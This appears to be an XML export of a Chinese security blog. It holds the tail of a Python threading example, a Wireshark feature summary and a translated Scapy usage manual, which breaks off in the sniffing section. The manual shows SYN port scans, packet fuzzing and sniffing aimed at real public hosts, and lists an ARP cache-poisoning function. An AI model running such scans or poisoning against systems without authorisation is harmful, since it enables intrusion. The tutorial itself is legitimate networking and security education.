print 'Refilling candy...', try: candytray.release() except valueError: print 'full, skipping' else: print 'OK' lock.release() def buy(): lock.acquire() print 'Buying candy...', if candytray.acquire(False): print 'OK' else: print 'empty, skipping' lock.release() def producer(loops): for i in xrange(loops): refill() sleep(randrange(3)) def consumer(loops): for i in xrange(loops): buy() sleep(randrange(3)) def _main(): print 'starting at:', ctime() nloops = randrange(2, 6) print 'THE CANDY MACHINE (full with %d bars)!' % MAX Thread(target=consumer, args=(randrange(nloops, nloops+MAX+2),)).start() # buyer Thread(target=producer, args=(nloops,)).start() # vndr@register: def _atexit(): print 'all DONE at:', ctime()if __name__ == '__main__': _main()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wireshark常用功能]]></title>
    <url>%2F2017%2F02%2F22%2Fwireshark%E5%B8%B8%E7%94%A8%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[前言前些天回顾了一下《Wireshark数据包分析实战》，就想写一些关于协议/数据分析的东西，但也只是从本书中总结一些Wireshark常用的使用功能，书中写的很详细，这里算是一个简化版吧～ 一些常见的网络协议 ARP（OSI数据链路层）交换机上使用的内容寻址寄存器（CAM）将列出它在每一个端口的所有连接设备的MAC地址，负责将IP地址解析为MAC地址。 IP（OSI网络层） 1.互联网本身就是由无数局域网和路由器所组成的一个集合2.网络掩码有32位长，并且被设为1的每一位都标识着IP地址的对应部分时属于网络地址的，而剩下设为0的部分则标识着主机地址。3.IP地址和网络掩码为方便起见，通常被写成无类型域间选路（CIDR）的形式，在此形式下，一个完整的IP地址后面会有一个左斜杠（/），以及一个用来表示IP地址中网络部分位数的数字4.IP分片，以太网的MTU最大为1500字节（仅数据部分） TCP（OSI传输层） 1.TCP会话三次握手：1.A-&gt;B(SYN) &nbsp;&nbsp;&nbsp;&nbsp; 2.B-&gt;A(SYN/ACK) &nbsp;&nbsp;&nbsp;&nbsp; 3.A-&gt;B(ACK)终止会话：1.A-&gt;B(FIN/ACK) &nbsp;&nbsp;&nbsp;&nbsp; 2.B-&gt;A(ACK) &nbsp;&nbsp;&nbsp;&nbsp; 3.B-&gt;A(FIN/ACK) &nbsp;&nbsp;&nbsp;&nbsp; 4.A-&gt;B(ACK)重置：RST和ACK标志着通信的结束2.Wireshark会维护一个端口的列表，并记录着它们最普遍的应用。尽管列表还是以标准端口为主，但很多临时端口也关联着常用服务。并可通过Edit-&gt;Preference-&gt;Name Resolution，然后取消勾选Enable Transport Name Resolution 就可以将其禁用了。3.Wireshark为了分析将简便，引入了一个特性，可以将TCP数据包的序列号替换为相对值。Edit-&gt;Preferences-&gt;Protocols，选择TCP，然后取消Relative Sequence Numbers and Window Scaling框，并单击OK就可以禁用了。 DHCP（OSI应用层） 1.早先是由BOOTP协议（Bootstrap Protocol）解决给连接到网络的设备自动分配地址的问题。在目前的Wireshark中，Packets Detail面板仍是Bootstrap Protocol而不是DHCP。2.最主要任务就是在续租过程中向客户端分配IP地址。3.DHCP的DPRA过程 DNS（OSI应用层） 1.DNS查询过程2.区域传输 —— 备份主DNS服务器的信息到另一台备用DNS服务器，在两台设备之间传送区域数据完整区域传送（AXFR）增量区域传送（IXFR）：仅传送区域信息的一部分数据在传输时是基于TCP协议，因为TCP对于规模数据的传输更加可靠。 常用功能 File-&gt;Export 导出Save As 保存Merge 合并所捕获的数据包 【Ctrl-F】-&gt;Find（查找所匹配的第一个数据包）【Ctrl-N】 下一个数据包【Ctrl-B】 前一个数据包 Edit-&gt;Set Time Reference设定相对时间参数（只有当捕获的时间显示格式设定为相对于捕获开始的时间，设定数据包对时间参考才有意义） 高级特性之Statistcs -&gt; Endpoints 端点（给出了每一个端点的许多有用统计数据，包括每个端点的地址、传输发送数据包的数量和字节数） -&gt; Conversations 会话（记录两个端点之间的会话信息） -&gt; Protocol Hierachy 协议分层（查看协议） -&gt; Packet Lengths-&gt;Create Stat在正常情况下，一个以太网上的帧的最大长度为1518字节，除去以太网、IP以及TCP头，还剩下1460字节以供应用层协议的头域或者数据使用。以太网14字节 -&gt; IO Graphs Wireshark上的IO图窗口可以让你对网络上的吞吐量进行绘图 -&gt; TCP Stram Graph-&gt;Round Trip Time Graph 1.对RTT（Round-Trip Time，确认一个数据包已被成功接受所需要的时间）进行分析通常是被用来找到通信中的慢点和瓶颈，以确定是否存在延迟2.双向时间图（图中每一个点都代表了一个数据包的双向时间，你可以点击图中任何一个点，并将在Packet List面板中看到相应的数据包） -&gt;Flow Graph创建数据流图 高级特性之Analyze -&gt;Expert Info专家信息（对话&nbsp;&nbsp;&nbsp;注意&nbsp;&nbsp;&nbsp;警告&nbsp;&nbsp;&nbsp;错误） 其他 Capture-&gt;Options-&gt;name resolution捕获开始前有选项设置，如名字解析（会存在一些弊端：如会产生额外的数据包等） 更换解析器解析器可理解为网络原始数据流和Wireshark程序之间的翻译器Wireshark在给一个数据包选择解析器时也并非每次都能选对，尤其是当网络上的一个协议使用了不同于标准的配置，比如一个非默认端口（网络管理员通常会出于安全考虑，或者员工想要避开访问控制时进行设置）。这时我们可以更改Wireshark使用特定解析器的方式（注：进行强制解码时产生的更改，并不会在你保存捕获文件并关闭Wireshark后保存，每次打开捕获文件时，都要重新进行强制解码的设置）具体方法： 1.右键单击所要强制解码的数据包，并选择Decode As2.3.选好相应解码条件后单击OK]]></content>
      <categories>
        <category>proto</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Scapy中文使用手册]]></title>
    <url>%2F2017%2F02%2F08%2Fscapy_uses%2F</url>
    <content type="text"><![CDATA[原作者：Larryxi。from:http://www.secdev.org/projects/scapy/doc/usage.htmlby Larry 0x01 起航ScapyScapy的交互shell是运行在一个终端会话当中。因为需要root权限才能发送数据包，所以我们在这里使用sudo $ sudo scapy Welcome to Scapy (2.0.1-dev) &gt;&gt;&gt;在Windows当中，请打开命令提示符（cmd.exe），并确保您拥有管理员权限： C:\&gt;scapy INFO: No IPv6 support in kernel WARNING: No route found for IPv6 destination :: (no default route?) Welcome to Scapy (2.0.1-dev) &gt;&gt;&gt;如果您没有安装所有的可选包，Scapy将会告诉你有些功能不可用： INFO: Can&apos;t import python gnuplot wrapper . Won&apos;t be able to plot. INFO: Can&apos;t import PyX. Won&apos;t be able to use psdump() or pdfdump().虽然没有安装，但发送和接收数据包的基本功能仍能有效。 0x02 互动教程本节将会告诉您一些Scapy的功能。让我们按上文所述打开Scapy，亲自尝试些例子吧。 第一步让我们来建立一个数据包试一试 &gt;&gt;&gt; a=IP(ttl=10) &gt;&gt;&gt; a &lt; IP ttl=10 |&gt; &gt;&gt;&gt; a.src ’127.0.0.1’ &gt;&gt;&gt; a.dst=&quot;192.168.1.1&quot; &gt;&gt;&gt; a &lt; IP ttl=10 dst=192.168.1.1 |&gt; &gt;&gt;&gt; a.src ’192.168.8.14’ &gt;&gt;&gt; del(a.ttl) &gt;&gt;&gt; a &lt; IP dst=192.168.1.1 |&gt; &gt;&gt;&gt; a.ttl 64堆加层次（OSI参考模型）/操作符在两层之间起到一个组合的作用。当使用该操作符时，下层可以根据其上层，使它的一个或多个默认字段被重载。（您仍可以赋予您想要的值）一个字符串也可以被用作原料层（raw layer）。 &gt;&gt;&gt; IP() &lt;IP |&gt; &gt;&gt;&gt; IP()/TCP() &lt;IP frag=0 proto=TCP |&lt;TCP |&gt;&gt; &gt;&gt;&gt; Ether()/IP()/TCP() &lt;Ether type=0x800 |&lt;IP frag=0 proto=TCP |&lt;TCP |&gt;&gt;&gt; &gt;&gt;&gt; IP()/TCP()/&quot;GET / HTTP/1.0\r\n\r\n&quot; &lt;IP frag=0 proto=TCP |&lt;TCP |&lt;Raw load=&apos;GET / HTTP/1.0\r\n\r\n&apos; |&gt;&gt;&gt; &gt;&gt;&gt; Ether()/IP()/IP()/UDP() &lt;Ether type=0x800 |&lt;IP frag=0 proto=IP |&lt;IP frag=0 proto=UDP |&lt;UDP |&gt;&gt;&gt;&gt; &gt;&gt;&gt; IP(proto=55)/TCP() &lt;IP frag=0 proto=55 |&lt;TCP |&gt;&gt; 每一个数据包都可以被建立或分解（注意：在Python中_（下划线）是上一条语句执行的结果）： &gt;&gt;&gt; str(IP()) &apos;E\x00\x00\x14\x00\x01\x00\x00@\x00|\xe7\x7f\x00\x00\x01\x7f\x00\x00\x01&apos; &gt;&gt;&gt; IP(_) &lt;IP version=4L ihl=5L tos=0x0 len=20 id=1 flags= frag=0L ttl=64 proto=IP chksum=0x7ce7 src=127.0.0.1 dst=127.0.0.1 |&gt; &gt;&gt;&gt; a=Ether()/IP(dst=&quot;www.slashdot.org&quot;)/TCP()/&quot;GET /index.html HTTP/1.0 \n\n&quot; &gt;&gt;&gt; hexdump(a) 00 02 15 37 A2 44 00 AE F3 52 AA D1 08 00 45 00 ...7.D...R....E. 00 43 00 01 00 00 40 06 78 3C C0 A8 05 15 42 23 .C....@.x&lt;....B# FA 97 00 14 00 50 00 00 00 00 00 00 00 00 50 02 .....P........P. 20 00 BB 39 00 00 47 45 54 20 2F 69 6E 64 65 78 ..9..GET /index 2E 68 74 6D 6C 20 48 54 54 50 2F 31 2E 30 20 0A .html HTTP/1.0 . 0A . &gt;&gt;&gt; b=str(a) &gt;&gt;&gt; b &apos;\x00\x02\x157\xa2D\x00\xae\xf3R\xaa\xd1\x08\x00E\x00\x00C\x00\x01\x00\x00@\x06x&lt;\xc0 \xa8\x05\x15B#\xfa\x97\x00\x14\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00 \xbb9\x00\x00GET /index.html HTTP/1.0 \n\n&apos; &gt;&gt;&gt; c=Ether(b) &gt;&gt;&gt; c &lt;Ether dst=00:02:15:37:a2:44 src=00:ae:f3:52:aa:d1 type=0x800 |&lt;IP version=4L ihl=5L tos=0x0 len=67 id=1 flags= frag=0L ttl=64 proto=TCP chksum=0x783c src=192.168.5.21 dst=66.35.250.151 options=&apos;&apos; |&lt;TCP sport=20 dport=80 seq=0L ack=0L dataofs=5L reserved=0L flags=S window=8192 chksum=0xbb39 urgptr=0 options=[] |&lt;Raw load=&apos;GET /index.html HTTP/1.0 \n\n&apos; |&gt;&gt;&gt;&gt;我们看到一个分解的数据包将其所有的字段填充。那是因为我认为，附加有原始字符串的字段都有它自身的价值。如果这太冗长，hide_defaults()方法将会删除具有默认值的字段： &gt;&gt;&gt; c.hide_defaults() &gt;&gt;&gt; c &lt;Ether dst=00:0f:66:56:fa:d2 src=00:ae:f3:52:aa:d1 type=0x800 |&lt;IP ihl=5L len=67 frag=0 proto=TCP chksum=0x783c src=192.168.5.21 dst=66.35.250.151 |&lt;TCP dataofs=5L chksum=0xbb39 options=[] |&lt;Raw load=&apos;GET /index.html HTTP/1.0 \n\n&apos; |&gt;&gt;&gt;&gt;读取PCAP文件你可以从PCAP文件中读取数据包，并将其写入到一个PCAP文件中。 &gt;&gt;&gt; a=rdpcap(&quot;/spare/captures/isakmp.cap&quot;) &gt;&gt;&gt; a &lt;isakmp.cap: UDP:721 TCP:0 ICMP:0 Other:0&gt;图形转储（PDF，PS）如果您已经安装PyX，您可以做一个数据包的图形PostScript/ PDF转储（见下面丑陋的PNG图像，PostScript/PDF则具有更好的质量…） &gt;&gt;&gt; a[423].pdfdump(layer_shift=1) &gt;&gt;&gt; a[423].psdump(&quot;/tmp/isakmp_pkt.eps&quot;,layer_shift=1) 命令 效果 str(pkt) 组装数据包 hexdump(pkt) 十六进制转储 ls(pkt) 显示出字段值的列表 pkt.summary() 一行摘要 pkt.show() 针对数据包的展开试图 pkt.show2() 显示聚合的数据包（例如，计算好了校验和） pkt.sprintf() 用数据包字段填充格式字符串 pkt.decode_payload_as() 改变payload的decode方式 pkt.psdump() 绘制一个解释说明的PostScript图表 pkt.pdfdump() 绘制一个解释说明的PDF pkt.command() 返回可以生成数据包的Scapy命令生成一组数据包目前我们只是生成一个数据包。让我们看看如何轻易地定制一组数据包。整个数据包的每一个字段（甚至是网络层次）都可以是一组。在这里隐含地定义了一组数据包的概念，意即是使用所有区域之间的笛卡尔乘积来生成的一组数据包。 &gt;&gt;&gt; a=IP(dst=&quot;www.slashdot.org/30&quot;) &gt;&gt;&gt; a &lt;IP dst=Net(&apos;www.slashdot.org/30&apos;) |&gt; &gt;&gt;&gt; [p for p in a] [&lt;IP dst=66.35.250.148 |&gt;, &lt;IP dst=66.35.250.149 |&gt;, &lt;IP dst=66.35.250.150 |&gt;, &lt;IP dst=66.35.250.151 |&gt;] &gt;&gt;&gt; b=IP(ttl=[1,2,(5,9)]) &gt;&gt;&gt; b &lt;IP ttl=[1, 2, (5, 9)] |&gt; &gt;&gt;&gt; [p for p in b] [&lt;IP ttl=1 |&gt;, &lt;IP ttl=2 |&gt;, &lt;IP ttl=5 |&gt;, &lt;IP ttl=6 |&gt;, &lt;IP ttl=7 |&gt;, &lt;IP ttl=8 |&gt;, &lt;IP ttl=9 |&gt;] &gt;&gt;&gt; c=TCP(dport=[80,443]) &gt;&gt;&gt; [p for p in a/c] [&lt;IP frag=0 proto=TCP dst=66.35.250.148 |&lt;TCP dport=80 |&gt;&gt;, &lt;IP frag=0 proto=TCP dst=66.35.250.148 |&lt;TCP dport=443 |&gt;&gt;, &lt;IP frag=0 proto=TCP dst=66.35.250.149 |&lt;TCP dport=80 |&gt;&gt;, &lt;IP frag=0 proto=TCP dst=66.35.250.149 |&lt;TCP dport=443 |&gt;&gt;, &lt;IP frag=0 proto=TCP dst=66.35.250.150 |&lt;TCP dport=80 |&gt;&gt;, &lt;IP frag=0 proto=TCP dst=66.35.250.150 |&lt;TCP dport=443 |&gt;&gt;, &lt;IP frag=0 proto=TCP dst=66.35.250.151 |&lt;TCP dport=80 |&gt;&gt;, &lt;IP frag=0 proto=TCP dst=66.35.250.151 |&lt;TCP dport=443 |&gt;&gt;]某些操作（如修改一个数据包中的字符串）无法对于一组数据包使用。在这些情况下，如果您忘记展开您的数据包集合，只有您忘记生成的列表中的第一个元素会被用于组装数据包。 命令 效果 summary() 显示一个关于每个数据包的摘要列表 nsummary() 同上，但规定了数据包数量 conversations() 显示一个会话图表 show() 显示首选表示（通常用nsummary()） filter() 返回一个lambda过滤后的数据包列表 hexdump() 返回所有数据包的一个hexdump hexraw() 返回所以数据包Raw layer的hexdump padding() 返回一个带填充的数据包的hexdump nzpadding() 返回一个具有非零填充的数据包的hexdump plot() 规划一个应用到数据包列表的lambda函数 make table() 根据lambda函数来显示表格发送数据包现在我们知道了如何处理数据包。让我们来看看如何发送它们。send()函数将会在第3层发送数据包。也就是说它会为你处理路由和第2层的数据。sendp()函数将会工作在第2层。选择合适的接口和正确的链路层协议都取决于你。 &gt;&gt;&gt; send(IP(dst=&quot;1.2.3.4&quot;)/ICMP()) . Sent 1 packets. &gt;&gt;&gt; sendp(Ether()/IP(dst=&quot;1.2.3.4&quot;,ttl=(1,4)), iface=&quot;eth1&quot;) .... Sent 4 packets. &gt;&gt;&gt; sendp(&quot;I&apos;m travelling on Ethernet&quot;, iface=&quot;eth1&quot;, loop=1, inter=0.2) ................^C Sent 16 packets. &gt;&gt;&gt; sendp(rdpcap(&quot;/tmp/pcapfile&quot;)) # tcpreplay ........... Sent 11 packets.Fuzzingfuzz()函数可以通过一个具有随机值、数据类型合适的对象，来改变任何默认值，但该值不能是被计算的（像校验和那样）。这使得可以快速建立循环模糊化测试模板。在下面的例子中，IP层是正常的，UDP层和NTP层被fuzz。UDP的校验和是正确的，UDP的目的端口被NTP重载为123，而且NTP的版本被更变为4.其他所有的端口将被随机分组： &gt;&gt;&gt; send(IP(dst=&quot;target&quot;)/fuzz(UDP()/NTP(version=4)),loop=1) ................^C Sent 16 packets.发送和接收数据包（sr）现在让我们做一些有趣的事情。sr()函数是用来发送数据包和接收应答。该函数返回一对数据包及其应答，还有无应答的数据包。sr1()函数是一种变体，用来返回一个应答数据包。发送的数据包必须是第3层报文（IP，ARP等）。srp()则是使用第2层报文（以太网，802.3等）。 &gt;&gt;&gt; p=sr1(IP(dst=&quot;www.slashdot.org&quot;)/ICMP()/&quot;XXXXXXXXXXX&quot;) Begin emission: ...Finished to send 1 packets. .* Received 5 packets, got 1 answers, remaining 0 packets &gt;&gt;&gt; p &lt;IP version=4L ihl=5L tos=0x0 len=39 id=15489 flags= frag=0L ttl=42 proto=ICMP chksum=0x51dd src=66.35.250.151 dst=192.168.5.21 options=&apos;&apos; |&lt;ICMP type=echo-reply code=0 chksum=0xee45 id=0x0 seq=0x0 |&lt;Raw load=&apos;XXXXXXXXXXX&apos; |&lt;Padding load=&apos;\x00\x00\x00\x00&apos; |&gt;&gt;&gt;&gt; &gt;&gt;&gt; p.show() ---[ IP ]--- version = 4L ihl = 5L tos = 0x0 len = 39 id = 15489 flags = frag = 0L ttl = 42 proto = ICMP chksum = 0x51dd src = 66.35.250.151 dst = 192.168.5.21 options = &apos;&apos; ---[ ICMP ]--- type = echo-reply code = 0 chksum = 0xee45 id = 0x0 seq = 0x0 ---[ Raw ]--- load = &apos;XXXXXXXXXXX&apos; ---[ Padding ]--- load = &apos;\x00\x00\x00\x00&apos;DNS查询（rd = recursion desired）。主机192.168.5.1是我的DNS服务器。注意从我Linksys来的非空填充具有Etherleak缺陷： &gt;&gt;&gt; sr1(IP(dst=&quot;192.168.5.1&quot;)/UDP()/DNS(rd=1,qd=DNSQR(qname=&quot;www.slashdot.org&quot;))) Begin emission: Finished to send 1 packets. ..* Received 3 packets, got 1 answers, remaining 0 packets &lt;IP version=4L ihl=5L tos=0x0 len=78 id=0 flags=DF frag=0L ttl=64 proto=UDP chksum=0xaf38 src=192.168.5.1 dst=192.168.5.21 options=&apos;&apos; |&lt;UDP sport=53 dport=53 len=58 chksum=0xd55d |&lt;DNS id=0 qr=1L opcode=QUERY aa=0L tc=0L rd=1L ra=1L z=0L rcode=ok qdcount=1 ancount=1 nscount=0 arcount=0 qd=&lt;DNSQR qname=&apos;www.slashdot.org.&apos; qtype=A qclass=IN |&gt; an=&lt;DNSRR rrname=&apos;www.slashdot.org.&apos; type=A rclass=IN ttl=3560L rdata=&apos;66.35.250.151&apos; |&gt; ns=0 ar=0 |&lt;Padding load=&apos;\xc6\x94\xc7\xeb&apos; |&gt;&gt;&gt;&gt;发送和接收函数族是scapy中的核心部分。它们返回一对两个列表。第一个就是发送的数据包及其应答组成的列表，第二个是无应答数据包组成的列表。为了更好地呈现它们，它们被封装成一个对象，并且提供了一些便于操作的方法： &gt;&gt;&gt; sr(IP(dst=&quot;192.168.8.1&quot;)/TCP(dport=[21,22,23])) Received 6 packets, got 3 answers, remaining 0 packets (&lt;Results: UDP:0 TCP:3 ICMP:0 Other:0&gt;, &lt;Unanswered: UDP:0 TCP:0 ICMP:0 Other:0&gt;) &gt;&gt;&gt; ans,unans=_ &gt;&gt;&gt; ans.summary() IP / TCP 192.168.8.14:20 &gt; 192.168.8.1:21 S ==&gt; Ether / IP / TCP 192.168.8.1:21 &gt; 192.168.8.14:20 RA / Padding IP / TCP 192.168.8.14:20 &gt; 192.168.8.1:22 S ==&gt; Ether / IP / TCP 192.168.8.1:22 &gt; 192.168.8.14:20 RA / Padding IP / TCP 192.168.8.14:20 &gt; 192.168.8.1:23 S ==&gt; Ether / IP / TCP 192.168.8.1:23 &gt; 192.168.8.14:20 RA / Padding如果对于应答数据包有速度限制，你可以通过inter参数来设置两个数据包之间等待的时间间隔。如果有些数据包丢失了，或者设置时间间隔不足以满足要求，你可以重新发送所有无应答数据包。你可以简单地对无应答数据包列表再调用一遍函数，或者去设置retry参数。如果retry设置为3，scapy会对无应答的数据包重复发送三次。如果retry设为-3，scapy则会一直发送无应答的数据包，直到。timeout参数设置在最后一个数据包发出去之后的等待时间： SYN Scans在Scapy提示符中执行一下命令，可以对经典的SYN Scan初始化： &gt;&gt;&gt; sr1(IP(dst=&quot;72.14.207.99&quot;)/TCP(dport=80,flags=&quot;S&quot;))以上向Google的80端口发送了一个SYN数据包，会在接收到一个应答后退出： Begin emission: .Finished to send 1 packets. * Received 2 packets, got 1 answers, remaining 0 packets &lt;IP version=4L ihl=5L tos=0x20 len=44 id=33529 flags= frag=0L ttl=244 proto=TCP chksum=0x6a34 src=72.14.207.99 dst=192.168.1.100 options=// | &lt;TCP sport=www dport=ftp-data seq=2487238601L ack=1 dataofs=6L reserved=0L flags=SA window=8190 chksum=0xcdc7 urgptr=0 options=[(&apos;MSS&apos;, 536)] | &lt;Padding load=&apos;V\xf7&apos; |&gt;&gt;&gt;从以上的输出中可以看出，Google返回了一个SA（SYN-ACK）标志位，表示80端口是open的。 使用其他标志位扫描一下系统的440到443端口： &gt;&gt;&gt; sr(IP(dst=&quot;192.168.1.1&quot;)/TCP(sport=666,dport=(440,443),flags=&quot;S&quot;))或者 &gt;&gt;&gt; sr(IP(dst=&quot;192.168.1.1&quot;)/TCP(sport=RandShort(),dport=[440,441,442,443],flags=&quot;S&quot;))可以对收集的数据包进行摘要（summary），来快速地浏览响应： &gt;&gt;&gt; ans,unans = _ &gt;&gt;&gt; ans.summary() IP / TCP 192.168.1.100:ftp-data &gt; 192.168.1.1:440 S ======&gt; IP / TCP 192.168.1.1:440 &gt; 192.168.1.100:ftp-data RA / Padding IP / TCP 192.168.1.100:ftp-data &gt; 192.168.1.1:441 S ======&gt; IP / TCP 192.168.1.1:441 &gt; 192.168.1.100:ftp-data RA / Padding IP / TCP 192.168.1.100:ftp-data &gt; 192.168.1.1:442 S ======&gt; IP / TCP 192.168.1.1:442 &gt; 192.168.1.100:ftp-data RA / Padding IP / TCP 192.168.1.100:ftp-data &gt; 192.168.1.1:https S ======&gt; IP / TCP 192.168.1.1:https &gt; 192.168.1.100:ftp-data SA / Padding以上显示了我们在扫描过程中的请求应答对。我们也可以用一个循环只显示我们感兴趣的信息： &gt;&gt;&gt; ans.summary( lambda(s,r): r.sprintf(&quot;%TCP.sport% \t %TCP.flags%&quot;) ) 440 RA 441 RA 442 RA https SA可以使用make_table()函数建立一个表格，更好地显示多个目标信息： &gt;&gt;&gt; ans,unans = sr(IP(dst=[&quot;192.168.1.1&quot;,&quot;yahoo.com&quot;,&quot;slashdot.org&quot;])/TCP(dport=[22,80,443],flags=&quot;S&quot;)) Begin emission: .......*.**.......Finished to send 9 packets. **.*.*..*.................. Received 362 packets, got 8 answers, remaining 1 packets &gt;&gt;&gt; ans.make_table( ... lambda(s,r): (s.dst, s.dport, ... r.sprintf(&quot;{TCP:%TCP.flags%}{ICMP:%IP.src% - %ICMP.type%}&quot;))) 66.35.250.150 192.168.1.1 216.109.112.135 22 66.35.250.150 - dest-unreach RA - 80 SA RA SA 443 SA SA SA 在以上的例子中，如果接收到作为响应的ICMP数据包而不是预期的TCP数据包，就会打印出ICMP差错类型（error type）。 对于更大型的扫描，我们可能对某个响应感兴趣，下面的例子就只显示设置了”SA”标志位的数据包： &gt;&gt;&gt; ans.nsummary(lfilter = lambda (s,r): r.sprintf(&quot;%TCP.flags%&quot;) == &quot;SA&quot;) 0003 IP / TCP 192.168.1.100:ftp_data &gt; 192.168.1.1:https S ======&gt; IP / TCP 192.168.1.1:https &gt; 192.168.1.100:ftp_data SA如果我们想对响应进行专业分析，我们可以使用使用以下的命令显示哪些端口是open的： &gt;&gt;&gt; ans.summary(lfilter = lambda (s,r): r.sprintf(&quot;%TCP.flags%&quot;) == &quot;SA&quot;,prn=lambda(s,r):r.sprintf(&quot;%TCP.sport% is open&quot;)) https is open对于更大型的扫描，我们可以建立一个端口开放表： &gt;&gt;&gt; ans.filter(lambda (s,r):TCP in r and r[TCP].flags&amp;2).make_table(lambda (s,r): ... (s.dst, s.dport, &quot;X&quot;)) 66.35.250.150 192.168.1.1 216.109.112.135 80 X - X 443 X X X如果以上的方法还不够，Scapy还包含一个report_ports()函数，该函数不仅可以自动化SYN scan，而且还会对收集的结果以LaTeX形式输出： &gt;&gt;&gt; report_ports(&quot;192.168.1.1&quot;,(440,443)) Begin emission: ...*.**Finished to send 4 packets. * Received 8 packets, got 4 answers, remaining 0 packets &apos;\\begin{tabular}{|r|l|l|}\n\\hline\nhttps &amp; open &amp; SA \\\\\n\\hline\n440 &amp; closed &amp; TCP RA \\\\\n441 &amp; closed &amp; TCP RA \\\\\n442 &amp; closed &amp; TCP RA \\\\\n\\hline\n\\hline\n\\end{tabular}\n&apos;TCP tracerouteTCP路由追踪： &gt;&gt;&gt; ans,unans=sr(IP(dst=target, ttl=(4,25),id=RandShort())/TCP(flags=0x2)) *****.******.*.***..*.**Finished to send 22 packets. ***...... Received 33 packets, got 21 answers, remaining 1 packets &gt;&gt;&gt; for snd,rcv in ans: ... print snd.ttl, rcv.src, isinstance(rcv.payload, TCP) ... 5 194.51.159.65 0 6 194.51.159.49 0 4 194.250.107.181 0 7 193.251.126.34 0 8 193.251.126.154 0 9 193.251.241.89 0 10 193.251.241.110 0 11 193.251.241.173 0 13 208.172.251.165 0 12 193.251.241.173 0 14 208.172.251.165 0 15 206.24.226.99 0 16 206.24.238.34 0 17 173.109.66.90 0 18 173.109.88.218 0 19 173.29.39.101 1 20 173.29.39.101 1 21 173.29.39.101 1 22 173.29.39.101 1 23 173.29.39.101 1 24 173.29.39.101 1注意：TCP路由跟踪和其他高级函数早已被构造好了： &gt;&gt;&gt; lsc() sr : Send and receive packets at layer 3 sr1 : Send packets at layer 3 and return only the first answer srp : Send and receive packets at layer 2 srp1 : Send and receive packets at layer 2 and return only the first answer srloop : Send a packet at layer 3 in loop and print the answer each time srploop : Send a packet at layer 2 in loop and print the answer each time sniff : Sniff packets p0f : Passive OS fingerprinting: which OS emitted this TCP SYN ? arpcachepoison : Poison target&apos;s cache with (your MAC,victim&apos;s IP) couple send : Send packets at layer 3 sendp : Send packets at layer 2 traceroute : Instant TCP traceroute arping : Send ARP who-has requests to determine which hosts are up ls : List available layers, or infos on a given layer lsc : List user commands queso : Queso OS fingerprinting nmap_fp : nmap fingerprinting report_ports : portscan a target and output a LaTeX table dyndns_add : Send a DNS add message to a nameserver for &quot;name&quot; to have a new &quot;rdata&quot; dyndns_del : Send a DNS delete message to a nameserver for &quot;name&quot; [...]配置高级sockets发送和接收数据包的过程是相当复杂的。 Sniffing我们可以简单地捕获数据包，或者是克隆tcpdump或tethereal的功能。如果没有指定interface，则会 在所有的interface上进行嗅探： &gt;&gt;&gt; sniff(filter=&quot;icmp and host 66.35.250.151&quot;, count=2) &lt;Sniffed: UDP:0 TCP:0 ICMP:2 Other:0&gt; &gt;&gt;&gt; a=_ &gt;&gt;&gt; a.nsummary() 0000 Ether / IP / ICMP 192.168.5.21 echo-request 0 / Raw 0001 Ether / IP / ICMP 192.168.5.21 echo-request 0 / Raw &gt;&gt;&gt; a[1] &lt;Ether dst=00:ae:f3:52:aa:d1 src=00:02:15:37:a2:44 type=0x800 |&lt;IP version=4L ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=ICMP chksum=0x3831 src=192.168.5.21 dst=66.35.250.151 options=&apos;&apos; |&lt;ICMP type=echo-request code=0 chksum=0x6571 id=0x8745 seq=0x0 |&lt;Raw load=&apos;B\xf7g\xda\x00\x07um\x08\t\n\x0b \x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d \x1e\x1f !\x22#$%&amp;\&apos;()*+,-./01234567&apos; |&gt;&gt;&gt;&gt; &gt;&gt;&gt; sniff(iface=&quot;wifi0&quot;, prn=lambda x: x.summary()) 802.11 Management 8 ff:ff:ff:ff:ff:ff / 802.11 Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info 133 802.11 Management 4 ff:ff:ff:ff:ff:ff / 802.11 Probe Request / Info SSID / Info Rates 802.11 Management 5 00:0a:41:ee:a5:50 / 802.11 Probe Response / Info SSID / Info Rates / Info DSset / Info 133 802.11 Management 4 ff:ff:ff:ff:ff:ff / 802.11 Probe Request / Info SSID / Info Rates 802.11 Management 4 ff:ff:ff:ff:ff:ff / 802.11 Probe Request / Info SSID / Info Rates 802.11 Management 8 ff:ff:ff:ff:ff:ff / 802.11 Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info 133 802.11 Management 11 00:07:50:d6:44:3f / 802.11 Authentication 802.11 Management 11 00:0a:41:ee:a5:50 / 802.11 Authentication 802.11 Management 0 00:07:50:d6:44:3f / 802.11 Association Request / Info SSID / Info Rates / Info 133 / Info 149 802.11 Management 1 00:0a:41:ee:a5:50 / 802.11 Association Response / Info Rates / Info 133 / Info 149 802.11 Management 8 ff:ff:ff:ff:ff:ff / 802.11 Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info 133 802.11 Management 8 ff:ff:ff:ff:ff:ff / 802.11 Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info 133 802.11 / LLC / SNAP / ARP who has 172.20.70.172 says 172.20.70.171 / Padding 802.11 / LLC / SNAP / ARP is at 00:0a:b7:4b:9c:dd says 172.20.70.172 / Padding 802.11 / LLC / SNAP / IP / ICMP echo-request 0 / Raw 802.11 / LLC / SNAP / IP / ICMP echo-reply 0 / Raw &gt;&gt;&gt; sniff(iface=&quot;eth1&quot;, prn=lambda x: x.show()) ---[ Ethernet ]--- dst = 00:ae:f3:52:aa:d1 src = 00:02:15:37:a2:44 type = 0x800 ---[ IP ]--- version = 4L ihl = 5L tos = 0x0 len = 84 id = 0 flags = DF frag = 0L ttl = 64 proto = ICMP chksum = 0x3831 src = 192.168.5.21 dst = 66.35.250.151 options = &apos;&apos; ---[ ICMP ]--- type = echo-request code = 0 chksum = 0x89d9 id = 0xc245 seq = 0x0 ---[ Raw ]--- load = 